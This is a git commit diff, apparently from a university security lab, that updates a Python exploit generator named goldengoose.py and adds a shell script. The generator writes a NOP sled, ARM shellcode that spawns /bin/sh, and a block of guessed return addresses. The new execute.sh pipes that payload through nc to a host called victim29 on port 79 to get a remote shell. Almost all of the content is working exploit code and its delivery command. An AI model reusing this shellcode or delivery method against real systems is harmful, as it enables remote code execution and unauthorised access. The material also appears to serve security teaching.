8a36fa1f7f5346ca4ecf19def0a9296a748fb6e0
Stephen Dean <kdt298@my.utsa.edu>
2022-10-26 18:02:57 -0500

    fdfd

--- victim28/goldengoose.py
+++ victim28/goldengoose.py
@@ -3,9 +3,11 @@ import os
 
 offset = int(sys.argv[1])
 
-NOPSLED = bytes.fromhex('e1a01001')
+NOPSLED = b'\x01\x10\x81\xe1'
 NOPSLED = NOPSLED * 0x20
-SHELLCODE = b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0c\x30\xc0\x46\x01\x90\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68"
+
+SHELLCODE3 = b'hp\x00\xe3AqD\xe3\x04p-\xe5/\x7f\x02\xe3/sG\xe3\x04p-\xe5/r\x06\xe3i~F\xe3\x04p-\xe5\r\x00\xa0\xe1sx\x06\xe3\x04p-\xe5\x0c\xc0,\xe0\x04\xc0-\xe5\x04\x10\xa0\xe3\r\x10\x81\xe0\x01\xc0\xa0\xe1\x04\xc0-\xe5\r\x10\xa0\xe1\x02 "\xe0\x0bp\xa0\xe3\x00\x00\x00\xef'
+
 
 RETURNADDRESS = b"7efdf000"
 RETURNADDRESS = int(RETURNADDRESS, 16) + 0x20 * offset
@@ -13,7 +15,7 @@ RETURNADDRESS = RETURNADDRESS.to_bytes(4, 'little')
 RETURNADDRESSBLOCK = RETURNADDRESS * 0x100
 
 with os.fdopen(sys.stdout.fileno(), "wb", closefd=False) as stdout:
-    stdout.write(NOPSLED + SHELLCODE + RETURNADDRESSBLOCK + B'\n')
+    stdout.write(NOPSLED + SHELLCODE3 + RETURNADDRESSBLOCK + b'\n')
 
 with os.fdopen(sys.stderr.fileno(), "w", closefd=False) as stderr:
     stderr.write(RETURNADDRESS.hex() + "\n")
---
+++ victim31/execute.sh
@@ -0,0 +1,3 @@
+(python3 goldenstring.py 4167 && cat) | nc victim29 79
+
+
